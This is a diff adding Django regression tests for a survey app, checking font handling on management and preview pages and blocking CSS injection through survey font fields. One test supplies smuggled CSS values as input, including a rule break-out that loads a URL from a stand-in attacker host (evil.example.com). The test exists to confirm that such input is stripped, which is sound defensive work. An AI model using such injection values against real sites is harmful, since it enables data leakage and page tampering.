@@ -505,3 +505,107 @@ def test_rendered_page_blocks_font_body_block_injection():
     assert (
         "color: red; }" not in content
     ), "CSS block injection via font_body must not reach the rendered page"
+
+
+# ===========================================================================
+# Surface 9 – survey.style font overrides on survey management pages
+# (dashboard / groups / group builder set ctx["brand"] from survey.style)
+# ===========================================================================
+
+
+def _survey_with_custom_fonts(font_heading, font_body):
+    from checktick_app.surveys.models import Survey
+
+    owner = User.objects.create_user(username="fontowner", password=FIXTURE_CRED)
+    survey = Survey.objects.create(
+        owner=owner,
+        name="Font Survey",
+        slug="font-survey",
+        style={"font_heading": font_heading, "font_body": font_body},
+    )
+    client = Client()
+    client.force_login(owner)
+    return survey, client
+
+
+@pytest.mark.django_db
+def test_management_pages_always_use_platform_fonts():
+    """SURFACE 9 regression – management pages must ignore survey.style fonts.
+
+    The dashboard/groups/builder views override ctx["brand"] from
+    survey.style for title/icon/theme/primary, but fonts are management
+    chrome: they must always come from the platform brand (settings /
+    SiteBranding), never from per-survey style. Survey fonts apply only on
+    respondent-facing pages (detail/preview).
+    """
+    from django.conf import settings
+
+    from checktick_app.core.theme_utils import sanitize_font_family
+
+    survey, client = _survey_with_custom_fonts(
+        "'Roboto', Arial, sans-serif", "Georgia, serif"
+    )
+    platform_heading = sanitize_font_family(settings.BRAND_FONT_HEADING)
+    platform_body = sanitize_font_family(settings.BRAND_FONT_BODY)
+    for url in (
+        f"/surveys/{survey.slug}/dashboard/",
+        f"/surveys/{survey.slug}/groups/",
+    ):
+        response = client.get(url)
+        assert response.status_code == 200, url
+        content = response.content.decode()
+        assert (
+            f"--font-heading: {platform_heading};" in content
+        ), f"platform font_heading must render on management page {url}"
+        assert (
+            f"--font-body: {platform_body};" in content
+        ), f"platform font_body must render on management page {url}"
+        assert (
+            "'Roboto', Arial, sans-serif" not in content
+        ), f"survey.style fonts must not leak onto management page {url}"
+        assert (
+            "&#x27;Roboto&#x27;" not in content
+        ), f"font stack must not be HTML-escaped on {url}"
+
+
+@pytest.mark.django_db
+def test_survey_style_fonts_render_sanitised_on_preview_page():
+    """SURFACE 9 – respondent-facing pages still apply per-survey fonts,
+    sanitised (valid CSS, no HTML-escaping of quotes)."""
+    survey, client = _survey_with_custom_fonts(
+        "'Roboto', Arial, sans-serif", "Georgia, serif"
+    )
+    response = client.get(f"/surveys/{survey.slug}/preview/")
+    assert response.status_code == 200
+    content = response.content.decode()
+    assert (
+        "--font-heading: 'Roboto', Arial, sans-serif;" in content
+    ), "survey.style font_heading must render unescaped on the preview page"
+    assert (
+        "&#x27;Roboto&#x27;" not in content
+    ), "survey.style font_heading must not be HTML-escaped on the preview page"
+    assert "--font-body: Georgia, serif;" in content
+
+
+@pytest.mark.django_db
+def test_survey_style_fonts_block_css_injection_on_survey_pages():
+    """SURFACE 9 – survey.style font values are user input and must never
+    reach a rendered <style> block unsanitised (management or respondent)."""
+    survey, client = _survey_with_custom_fonts(
+        "Arial; } h1 { background: url(https://evil.example.com/?",
+        "'Roboto', sans-serif; } a { color: red; }",
+    )
+    for url in (
+        f"/surveys/{survey.slug}/dashboard/",
+        f"/surveys/{survey.slug}/groups/",
+        f"/surveys/{survey.slug}/preview/",
+    ):
+        response = client.get(url)
+        assert response.status_code == 200, url
+        content = response.content.decode()
+        assert (
+            "evil.example.com" not in content
+        ), f"CSS block injection via survey.style font_heading must not reach {url}"
+        assert (
+            "color: red; }" not in content
+        ), f"CSS block injection via survey.style font_body must not reach {url}"
